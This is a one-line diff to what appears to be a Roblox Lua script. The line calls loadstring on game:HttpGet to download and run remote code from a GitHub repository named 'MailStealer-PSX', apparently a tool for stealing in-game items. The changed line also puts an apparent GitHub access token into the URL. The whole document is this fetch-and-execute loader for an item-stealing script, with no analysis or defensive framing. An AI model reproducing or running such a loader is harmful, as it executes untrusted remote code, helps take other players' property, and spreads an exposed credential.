@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRobloxx/MailStealer-PSX/main/MailStealer%20Script%201", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRobloxx/MailStealer-PSX-1/main/MailStealer1?token=GHSAT0AAAAAACJGZWCXTZOT75YBQNVIJXRCZJUFWDA", true))()
